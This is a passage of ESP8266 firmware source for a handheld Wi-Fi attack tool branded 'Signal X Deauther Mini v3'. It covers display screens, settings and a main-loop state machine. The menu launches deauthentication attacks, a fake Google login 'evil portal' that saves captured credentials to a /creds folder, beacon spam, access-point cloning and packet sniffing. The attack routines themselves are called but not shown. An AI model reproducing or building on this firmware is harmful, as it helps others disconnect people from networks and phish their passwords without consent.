    display.drawString(64, 20, "Auto scan networks");
    display.drawString(64, 32, "periodically?");

    display.drawRect(44 + 8, 45, 40 - 16, 16); 
    display.drawCircle(44 + 8, 45 + 8, 8);  
    display.drawCircle(44 + 40 - 8, 45 + 8, 8);
    display.drawCircle(44 + 8, 45 + 16 - 8, 8);
    display.drawCircle(44 + 40 - 8, 45 + 16 - 8, 8); 
    
    if (autoScanEnabled) {
        display.fillRect(64 + 8, 45, 20 - 16, 16); 
        display.fillCircle(64 + 8, 45 + 8, 8);  
        display.fillCircle(64 + 20 - 8, 45 + 8, 8); 
        display.fillCircle(64 + 8, 45 + 16 - 8, 8);
        display.fillCircle(64 + 20 - 8, 45 + 16 - 8, 8); 
        display.setColor(BLACK);
        display.drawString(74, 47, "ON");
        display.setColor(WHITE);
        display.drawString(54, 47, "OFF");
    } else {
        display.fillRect(44 + 8, 45, 20 - 16, 16);
        display.fillCircle(44 + 8, 45 + 8, 8); 
        display.fillCircle(44 + 20 - 8, 45 + 8, 8);
        display.fillCircle(44 + 8, 45 + 16 - 8, 8);
        display.fillCircle(44 + 20 - 8, 45 + 16 - 8, 8);
        display.setColor(BLACK);
        display.drawString(54, 47, "OFF");
        display.setColor(WHITE);
        display.drawString(74, 47, "ON");
    }
    
    display.display();
}

void generateRandomNetworks(int count) {
    networkCount = min(count, MAX_NETWORKS);
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = generateRandomSSID();
        networks[i].rssi = random(-90, -30);
        networks[i].encType = random(0, 4);
        networks[i].mac = generateRandomMAC();
        networks[i].channel = random(1, 14);
    }
}

void displaySaveNotification() {
    display.setColor(BLACK);
    display.fillRect(24, 20, 80, 24);
    display.setColor(WHITE);
    display.drawRect(24, 20, 80, 24);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 26, "Settings Saved");
    display.display();

    delay(1000);

    display.clear();
    display.display();
  }

void displayScanIntervalSetting() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "SCAN INTERVAL");
    display.setColor(WHITE);
    
    display.drawString(64, 20, "Time between auto scans");

    display.drawRect(14, 35, 100, 10);
    int sliderPos = map(scanInterval, 10, 120, 0, 100);
    display.fillRect(14, 35, sliderPos, 10);

    display.fillRect(14 + sliderPos - 2, 33, 4, 14);

    display.drawString(64, 50, String(scanInterval) + " seconds");
    
    display.display();
}

void displayAboutScreen() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "ABOUT");
    display.setColor(WHITE);
    
    display.drawString(64, 16, "Signal X");
    display.drawString(64, 28, "Dstike Deauther Mini v3");
    display.drawString(64, 40, "Firmware v1.2");
    display.drawString(64, 52, "ESP8266 WiFi Tool");
    
    display.display();
}

void handleRandomNetworks() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "RANDOM NETWORKS");
    display.setColor(WHITE);
    
    display.drawString(64, 20, "Generating random networks");

    int progress = (millis() / 50) % 100;
    display.drawProgressBar(14, 35, 100, 10, progress);
    
    int dots = (millis() / 200) % 4;
    String waiting = "Please wait";
    for (int i = 0; i < dots; i++) {
        waiting += ".";
    }
    display.drawString(64, 50, waiting);
    
    display.display();

    static unsigned long startTime = 0;
    if (startTime == 0) {
        startTime = millis();
    }
    
    if (millis() - startTime > 3000) {
        generateRandomNetworks(random(10, 30));
        startTime = 0;
        currentState = WIFI_RESULTS;
    }
}

void displayLEDSetting() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "LED FEEDBACK");
    display.setColor(WHITE);
    
    display.drawString(64, 20, "Status LED on GPIO 15:");

    display.drawRect(44 + 8, 35, 40 - 16, 16);
    display.drawCircle(44 + 8, 35 + 8, 8);  
    display.drawCircle(44 + 40 - 8, 35 + 8, 8); 
    display.drawCircle(44 + 8, 35 + 16 - 8, 8); 
    display.drawCircle(44 + 40 - 8, 35 + 16 - 8, 8); 
    
    if (settings.ledEnabled) {
        display.fillRect(64 + 8, 35, 20 - 16, 16);
        display.fillCircle(64 + 8, 35 + 8, 8); 
        display.fillCircle(64 + 20 - 8, 35 + 8, 8);
        display.fillCircle(64 + 8, 35 + 16 - 8, 8); 
        display.fillCircle(64 + 20 - 8, 35 + 16 - 8, 8);
        display.setColor(BLACK);
        display.drawString(74, 40, "ON");
        display.setColor(WHITE);
        display.drawString(54, 40, "OFF");

        int hue = (millis() / 50) % 360;
        for (int i = 0; i < 100; i++) {
            float h = hue + (i * 3.6);
            if (h > 360) h -= 360;

            int r, g, b;
            if (h < 60) {
                r = 255; g = h * 4.25; b = 0;
            } else if (h < 120) {
                r = 255 - ((h - 60) * 4.25); g = 255; b = 0;
            } else if (h < 180) {
                r = 0; g = 255; b = (h - 120) * 4.25;
            } else if (h < 240) {
                r = 0; g = 255 - ((h - 180) * 4.25); b = 255;
            } else if (h < 300) {
                r = (h - 240) * 4.25; g = 0; b = 255;
            } else {
                r = 255; g = 0; b = 255 - ((h - 300) * 4.25);
            }
            
            display.setColor((r > 127 || g > 127 || b > 127) ? WHITE : BLACK);
            display.drawHorizontalLine(14 + i, 55, 1);
        }
        display.setColor(WHITE);
    } else {
        display.fillRect(44 + 8, 35, 20 - 16, 16); 
        display.fillCircle(44 + 8, 35 + 8, 8);  
        display.fillCircle(44 + 20 - 8, 35 + 8, 8); 
        display.fillCircle(44 + 8, 35 + 16 - 8, 8);
        display.fillCircle(44 + 20 - 8, 35 + 16 - 8, 8); 
        display.setColor(BLACK);
        display.drawString(54, 40, "OFF");
        display.setColor(WHITE);
        display.drawString(74, 40, "ON");
    }
    
    display.display();
}

void showStartupAnimation() {
  display.clear();

  for(int i = 0; i < 32; i++) {
    display.clear();
    display.drawCircle(64, 32, i);
    display.display();
    delay(10);
  }
  
  for(int i = 0; i < 128; i += 4) {
    display.drawLine(i, 32, i + 2, 32 + sin(i * 0.2) * 10);
    display.display();
    delay(5);
  }

  for(int i = 0; i < 255; i += 15) {
    display.clear();
    display.setFont(ArialMT_Plain_16);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.setContrast(i);
    display.drawString(64, 20, "Signal X");
    display.setFont(ArialMT_Plain_10);
    display.drawString(64, 40, "Deauther Mini v3");
    display.display();
    delay(10);
  }
  
  delay(500);

  display.setContrast(currentBrightness);
}

void IRAM_ATTR onPacket(uint8_t *buf, uint16_t len);

void setup() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_16);
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  display.setContrast(currentBrightness);
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(A0, INPUT);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (!LittleFS.begin()) {
    LittleFS.format();
    LittleFS.begin();
  }
  
  if (!LittleFS.exists("/networks")) {
    LittleFS.mkdir("/networks");
  }
  
  if (!LittleFS.exists("/creds")) {
    LittleFS.mkdir("/creds");
  }
  
  showStartupAnimation();
}

void IRAM_ATTR onPacket(uint8_t *buf, uint16_t len) {
    lastPacketCount++;
    packetHistory[historyIndex] = min(50, packetsPerSecond);
    historyIndex = (historyIndex + 1) % 128;
}

void loop() {
    static unsigned long lastDebounceTime = 0;
    const unsigned long debounceDelay = 200;
    static unsigned long lastAttackUpdate = 0;
    static unsigned long buttonPressStartTime = 0;
    static bool buttonPressed = false;
    const unsigned long longPressTime = 2000;

    if (autoScanEnabled && millis() - lastAutoScan > scanInterval * 1000) {
      if (currentState == MAIN_MENU) {
        currentState = WIFI_SCANNING;
        performWiFiScan();
        currentState = MAIN_MENU;
      }
      lastAutoScan = millis();
    }

    if (digitalRead(BTN_SELECT) == LOW) {
      if (!buttonPressed) {
        buttonPressed = true;
        buttonPressStartTime = millis();
      }

      if (buttonPressed && (millis() - buttonPressStartTime > longPressTime)) {
        if (currentState == FILES_MENU || 
            currentState == WIFI_RESULTS || 
            currentState == DEAUTH_LIST ||
            currentState == EVIL_PORTAL_MENU ||
            currentState == PACKET_MON ||
            currentState == BEACON_RUNNING ||
            currentState == SSID_LIST ||
            currentState == AP_CLONE_RUNNING ||
            currentState == SETTINGS_MENU ||
            currentState == BRIGHTNESS_SETTING ||
            currentState == AUTO_SCAN_SETTING ||
            currentState == SCAN_INTERVAL_SETTING ||
            currentState == SOUND_SETTING ||
            currentState == LED_SETTING ||
            currentState == ABOUT_SCREEN ||
            currentState == WIFI_LOCATION ||
            currentState == WEB_CONTROL_RUNNING) {
          
          currentState = MAIN_MENU;
          buttonPressed = false;
          lastDebounceTime = millis();
        }
      }
    } else {
      buttonPressed = false;
    }
    
    if ((millis() - lastDebounceTime) > debounceDelay) {
        switch(currentState) {
            case MAIN_MENU:
                if (digitalRead(BTN_UP) == LOW && currentMenuItem > 0) {
                    currentMenuItem--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentMenuItem < MENU_ITEMS - 1) {
                    currentMenuItem++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    switch(currentMenuItem) {
                        case 0:
                            currentState = WIFI_SCANNING;
                            performWiFiScan();
                            currentState = WIFI_RESULTS;
                            break;
                        case 1:
                            currentState = WIFI_SCANNING;
                            performWiFiScan();
                            currentState = DEAUTH_LIST;
                            currentNetwork = 0;
                            break;
                        case 2:
                            currentState = EVIL_PORTAL_MENU;
                            currentPortalItem = 0;
                            break;
                        case 3:
                            currentState = PACKET_MON;
                            wifi_set_channel(currentChannel);
                            wifi_promiscuous_enable(1);
                            wifi_set_promiscuous_rx_cb(onPacket);
                            break;
                        case 4:
                            currentState = BEACON_RUNNING;
                            beaconStartTime = millis();
                            beaconPacketCount = 0;
                            wifi_set_opmode(STATION_MODE);
                            wifi_promiscuous_enable(1);
                            break;
                        case 5:
                            currentState = SSID_LIST;
                            currentNetwork = 0;
                            break;
                        case 6:
                            currentState = WIFI_SCANNING;
                            performWiFiScan();
                            currentState = AP_CLONE_RUNNING;
                            beaconStartTime = millis();
                            beaconPacketCount = 0;
                            wifi_set_opmode(STATION_MODE);
                            wifi_promiscuous_enable(1);
                            break;
                        case 7:
                            currentState = WIFI_LOCATION;
                            performWiFiLocation();
                            break;
                        case 8:
                            currentState = FILES_MENU;
                            break;
                        case 9:
                            currentState = SETTINGS_MENU;
                            currentSettingsItem = 0;
                            break;
                        case 10:
                            currentState = WEB_CONTROL_RUNNING;
                            startWebControlServer();
                            break;
                    }
                    lastDebounceTime = millis();
                }
                break;
  
            case SETTINGS_MENU:
                if (digitalRead(BTN_UP) == LOW && currentSettingsItem > 0) {
                    currentSettingsItem--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentSettingsItem < 7) {
                    currentSettingsItem++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    switch(currentSettingsItem) {
                        case 0:
                            currentState = BRIGHTNESS_SETTING;
                            break;
                        case 1:
                            currentState = AUTO_SCAN_SETTING;
                            break;
                        case 2:
                            currentState = SCAN_INTERVAL_SETTING;
                            break;
                        case 3:
                            currentState = SOUND_SETTING;
                            break;
                        case 4:
                            currentState = LED_SETTING;
                            break;
                        case 5:
                            if (saveSettings()) {
                                displaySaveNotification();
                            }
                            break;
                        case 6:
                            currentState = ABOUT_SCREEN;
                            break;
                        case 7:
                            currentState = MAIN_MENU;
                            break;
                    }
                    lastDebounceTime = millis();
                }
                break;
  
            case BRIGHTNESS_SETTING:
                if (digitalRead(BTN_UP) == LOW && currentBrightness < MAX_BRIGHTNESS) {
                    currentBrightness += 10;
                    if (currentBrightness > MAX_BRIGHTNESS) currentBrightness = MAX_BRIGHTNESS;
                    display.setContrast(currentBrightness);
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentBrightness > MIN_BRIGHTNESS) {
                    currentBrightness -= 10;
                    if (currentBrightness < MIN_BRIGHTNESS) currentBrightness = MIN_BRIGHTNESS;
                    display.setContrast(currentBrightness);
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case AUTO_SCAN_SETTING:
                if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
                    autoScanEnabled = !autoScanEnabled;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case SCAN_INTERVAL_SETTING:
                if (digitalRead(BTN_UP) == LOW && scanInterval < 120) {
                    scanInterval += 10;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && scanInterval > 10) {
                    scanInterval -= 10;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case SOUND_SETTING:
                if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
                    settings.soundEnabled = !settings.soundEnabled;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
                
            case LED_SETTING:
                if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
                    settings.ledEnabled = !settings.ledEnabled;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case ABOUT_SCREEN:
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = SETTINGS_MENU;
                    lastDebounceTime = millis();
                }
                break;
                
            case WIFI_LOCATION:
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    lastDebounceTime = millis();
                }
                displayWiFiLocation();
                break;
  
            case FILES_MENU:
                if (currentFileMenu == FILE_VIEWING_NETWORKS || currentFileMenu == FILE_VIEWING_CREDS) {
                    if (digitalRead(BTN_UP) == LOW && currentFileIndex > 0) {
                        currentFileIndex--;
                        lastSelectedFileIndex = -1;
                        lastDebounceTime = millis();
                    }
                    if (digitalRead(BTN_DOWN) == LOW && currentFileIndex < totalFiles - 1) {
                        currentFileIndex++;
                        lastSelectedFileIndex = -1;
                        lastDebounceTime = millis();
                    }
                    if (digitalRead(BTN_SELECT) == LOW) {
                        unsigned long currentTime = millis();

                        if (lastSelectedFileIndex == currentFileIndex && 
                            (currentTime - lastFileSelectTime) < doubleClickTime) {
                            deleteSelectedFile();
                            lastSelectedFileIndex = -1; 
                        } else {
                            lastSelectedFileIndex = currentFileIndex;
                            lastFileSelectTime = currentTime;
                        }
                        
                        lastDebounceTime = millis();
                    }
                } else {
                    if (digitalRead(BTN_UP) == LOW && currentFileMenu > FILE_NETWORKS) {
                        currentFileMenu = FILE_NETWORKS;
                        lastDebounceTime = millis();
                    }
                    if (digitalRead(BTN_DOWN) == LOW && currentFileMenu < FILE_CREDS) {
                        currentFileMenu = FILE_CREDS;
                        lastDebounceTime = millis();
                    }
                    if (digitalRead(BTN_SELECT) == LOW) {
                        if (currentFileMenu == FILE_NETWORKS) {
                            loadDirectoryFiles("/networks");
                            currentFileMenu = FILE_VIEWING_NETWORKS;
                        } else if (currentFileMenu == FILE_CREDS) {
                            loadDirectoryFiles("/creds");
                            currentFileMenu = FILE_VIEWING_CREDS;
                        }
                        lastDebounceTime = millis();
                    }
                }
                break;
  
            case WIFI_RESULTS:
                if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
                    currentNetwork--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount - 1) {
                    currentNetwork++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case SSID_LIST:
                if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
                    currentNetwork--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
                    currentNetwork++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    if (currentNetwork == networkCount) {
                        saveNetworksToFile();
                        currentState = MAIN_MENU;
                    }
                    lastDebounceTime = millis();
                }
                break;
  
            case DEAUTH_LIST:
                if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
                    currentNetwork--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
                    currentNetwork++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    handleDeauthAttack();
                    currentState = DEAUTH_INFO;
                    lastDebounceTime = millis();
                }
                break;
  
            case DEAUTH_INFO:
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    attackStartTime = 0;
                    lastDebounceTime = millis();
                }
                if (millis() - lastAttackUpdate > 50) {
                    handleDeauthAttack();
                    lastAttackUpdate = millis();
                }
                break;
  
            case EVIL_PORTAL_MENU:
                if (digitalRead(BTN_UP) == LOW && currentPortalItem > 0) {
                    currentPortalItem--;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentPortalItem < PORTAL_ITEMS - 1) {
                    currentPortalItem++;
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    if (currentPortalItem == 0) {
                        currentState = EVIL_PORTAL_RUNNING;
                        startGooglePortal();
                    }
                    lastDebounceTime = millis();
                }
                break;
  
            case EVIL_PORTAL_RUNNING:
                dnsServer.processNextRequest();
                webServer.handleClient();
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = EVIL_PORTAL_CREDS;
                    lastDebounceTime = millis();
                }
                break;
  
            case EVIL_PORTAL_CREDS:
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = EVIL_PORTAL_MENU;
                    lastDebounceTime = millis();
                }
                break;
  
            case PACKET_MON:
                if (digitalRead(BTN_UP) == LOW && currentChannel < 14) {
                    currentChannel++;
                    wifi_set_channel(currentChannel);
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_DOWN) == LOW && currentChannel > 1) {
                    currentChannel--;
                    wifi_set_channel(currentChannel);
                    lastDebounceTime = millis();
                }
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    wifi_promiscuous_enable(0);
                    lastDebounceTime = millis();
                }
                if (millis() - lastSecond >= 1000) {
                    packetsPerSecond = lastPacketCount;
                    lastPacketCount = 0;
                    lastSecond = millis();
                }
                break;
  
            case BEACON_RUNNING:
                handleBeaconAttack();
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    wifi_promiscuous_enable(0);
                    wifi_set_opmode(STATION_MODE);
                    lastDebounceTime = millis();
                }
                break;
  
            case AP_CLONE_RUNNING:
                handleAPClone();
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    wifi_promiscuous_enable(0);
                    wifi_set_opmode(STATION_MODE);
                    lastDebounceTime = millis();
                }
                break;
                
            case WEB_CONTROL_RUNNING:
                dnsServer.processNextRequest();
                webServer.handleClient();
                if (digitalRead(BTN_SELECT) == LOW) {
                    currentState = MAIN_MENU;
                    webServer.close();
                    WiFi.softAPdisconnect(true);
                    lastDebounceTime = millis();
                }
                break;
        }
    }
  
    switch(currentState) {
        case MAIN_MENU:
            drawMenu();
            break;
        case SETTINGS_MENU:
            displaySettingsMenu();
            break;
        case BRIGHTNESS_SETTING:
            displayBrightnessSetting();
            break;
        case AUTO_SCAN_SETTING:
            displayAutoScanSetting();
            break;
        case SCAN_INTERVAL_SETTING:
            displayScanIntervalSetting();
            break;
        case SOUND_SETTING:
            displaySoundSetting();
            break;
        case LED_SETTING:
            displayLEDSetting();
            break;
        case ABOUT_SCREEN:
            displayAboutScreen();
            break;
        case WIFI_LOCATION:
            displayWiFiLocation();
            break;
        case FILES_MENU:
            if (currentFileMenu == FILE_VIEWING_NETWORKS || currentFileMenu == FILE_VIEWING_CREDS) {
                displayFileContents();
            } else {
                displayFilesMenu();
            }
            break;
        case WIFI_RESULTS:
            displayNetworkInfo();
            break;
        case DEAUTH_LIST:
            displayDeauthList();
            break;
        case DEAUTH_INFO:
            displayDeauthInfo();
            break;
        case EVIL_PORTAL_MENU:
            displayPortalMenu();
            break;
        case EVIL_PORTAL_RUNNING:
            displayPortalRunning();
            break;
        case EVIL_PORTAL_CREDS:
            displayCredentials();
            break;
        case PACKET_MON:
            displayPacketMonitor();
            break;
        case BEACON_RUNNING:
            displayBeaconInfo();
            break;
        case SSID_LIST:
            displaySavedNetworks();
            break;
        case AP_CLONE_RUNNING:
            displayBeaconInfo();
            break;
        case WEB_CONTROL_RUNNING:
            displayWebControlScreen();
            break;
    }

    updateLED();
}
